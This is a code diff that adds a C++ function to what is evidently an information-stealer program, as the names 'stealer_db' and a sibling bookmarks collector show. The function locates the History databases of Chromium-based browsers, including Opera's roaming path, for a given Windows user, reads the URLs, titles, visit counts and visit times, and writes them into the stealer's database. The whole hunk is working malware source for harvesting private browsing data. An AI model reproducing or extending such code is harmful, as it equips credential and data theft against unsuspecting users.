@@ -301,3 +301,75 @@ BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db)
 
 	return true;
 }
+
+BOOL chromium_history_collector(std::string username, std::string stealer_db)
+{
+	std::vector<DataHolder> data_list;
+
+	std::string target_user_data;
+	std::string target_history_data;
+
+	// Those paths that contains \\ at the end means they have the default file 'User Data'
+	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
+	for (const auto& dir : browsers_chromium) {
+
+		if (dir.back() == '\\')
+			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
+		else
+		{
+			// in case of opera, the login data is in roaming instead of local
+			if (dir.find("Opera") != std::string::npos)
+				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
+			else
+				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
+		}
+
+		target_history_data = target_user_data + "\\Default\\History";
+
+		try {
+			sqlite3_stmt* stmt = query_database(target_history_data, "SELECT url, title, visit_count, last_visit_time FROM urls");
+
+			if (stmt == nullptr)
+			{
+				continue;
+			}
+
+			while (sqlite3_step(stmt) == SQLITE_ROW)
+			{
+				DataHolder data;
+
+				char* url = (char*)sqlite3_column_text(stmt, 0);
+				char* title = (char*)sqlite3_column_text(stmt, 1);
+				char* visit_count = (char*)sqlite3_column_text(stmt, 2);
+				char* last_visit_time = (char*)sqlite3_column_text(stmt, 3);
+
+				if (url != nullptr && title != nullptr) {
+
+					if ((strlen(url) == 0) || (strlen(title) == 0))
+						continue;
+
+
+					data.get_history_manager().setUrl(url);
+					data.get_history_manager().setTitle(title);
+					data.get_history_manager().setVisitCount(visit_count);
+					data.get_history_manager().setLastVisitTime(last_visit_time);
+					data.get_history_manager().setHost(dir);
+
+					data_list.push_back(data);
+				}
+				else {
+					continue;
+				}
+			}
+		}
+		catch (int e)
+		{
+			continue;
+		}
+	}
+
+	if (!dump_history_data(stealer_db, data_list, data_list.size()))
+		return false;
+
+	return true;
+}
